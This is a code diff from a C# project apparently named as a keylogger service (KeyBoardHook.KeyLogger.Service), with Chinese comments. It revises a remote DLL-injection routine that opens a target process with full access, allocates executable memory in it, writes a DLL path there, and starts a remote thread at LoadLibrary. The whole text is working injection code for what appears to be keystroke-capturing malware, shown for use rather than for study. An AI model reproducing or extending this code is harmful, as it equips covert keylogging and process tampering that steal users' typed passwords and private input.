@@ -174,7 +174,7 @@ namespace KeyBoardHook.KeyLogger.Service
                  NativeMethods.CloseHandle(snapshot);
              }
             
-             var openProcess = NativeMethods.OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), true, threadId);
+             var openProcess = NativeMethods.OpenProcess(NativeMethods.PROCESS_ALL_ACCESS, false, threadId);
              if (openProcess.Equals(IntPtr.Zero))
              {
                  MessageBox.Show("openProcess.Equals(IntPtr.Zero)");
@@ -198,7 +198,10 @@ namespace KeyBoardHook.KeyLogger.Service
 
             NativeMethods.CloseHandle(remoteThread);
             NativeMethods.CloseHandle(openProcess);
-            NativeMethods.CloseHandle(snapshot);
+            if (flag)
+            {
+                NativeMethods.CloseHandle(snapshot);
+            }
             
         }
         public void injectionCDLL(string className, string title)
@@ -209,9 +212,9 @@ namespace KeyBoardHook.KeyLogger.Service
 
             MessageBox.Show($@"injectionCDLL hWnd {hWnd},windowThreadProcessId {windowThreadProcessId},threadId -> {threadId}");
             {
-                // 用来获取目标进程句柄
-                IntPtr hndProc = NativeMethods.OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), false, threadId);
-                if (hndProc == IntPtr.Zero)
+                // 用来获取目标进程句柄  (0x2 | 0x8 | 0x10 | 0x20 | 0x400)
+                IntPtr openProcess = NativeMethods.OpenProcess(NativeMethods.PROCESS_ALL_ACCESS, false, threadId);
+                if (openProcess == IntPtr.Zero)
                 {
                     MessageBox.Show("OpenProcess 异常");
                     return;
@@ -227,25 +230,26 @@ namespace KeyBoardHook.KeyLogger.Service
                     return;
                 }
                     
-                // 用来将DLL路径写入目标进程内存
-                IntPtr lpAddress = NativeMethods.VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)sDllPath.Length, (0x1000 | 0x2000), 0X40);
+                // 用来将DLL路径写入目标进程内存 (0x1000 | 0x2000) , 0X40
+                IntPtr lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)sDllPath.Length + 1, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
 
                 if (lpAddress == IntPtr.Zero)
                 {
                     MessageBox.Show("VirtualAllocEx 异常");
                     return;
                 }
-                byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
+                // byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
+                // var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, bytes, (uint)bytes.Length, 0);
 
                 // 用来将DLL路径写入分配的缓冲区
-                var writeProcessMemory = NativeMethods.WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0);
+                var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, sDllPath, sDllPath.Length + 1, 0);
                 if (writeProcessMemory == 0)
                 {
                     MessageBox.Show("WriteProcessMemory 异常");
                     return;                    
                 }
 
-                var remoteThread = NativeMethods.CreateRemoteThread(hndProc, (IntPtr)null, (IntPtr)0, lpLLAddress, lpAddress, 0, (IntPtr)null); 
+                var remoteThread = NativeMethods.CreateRemoteThread(openProcess, (IntPtr)null, (IntPtr)0, lpLLAddress, lpAddress, 0, (IntPtr)null); 
                 if (remoteThread==(IntPtr)0)
                 {
                     MessageBox.Show("CreateRemoteThread 异常");
@@ -253,7 +257,7 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                 NativeMethods.WaitForSingleObject(remoteThread, 60 * 1000);        
                 NativeMethods.CloseHandle(remoteThread);
-                NativeMethods.CloseHandle(hndProc);
+                NativeMethods.CloseHandle(openProcess);
             }
             
         }
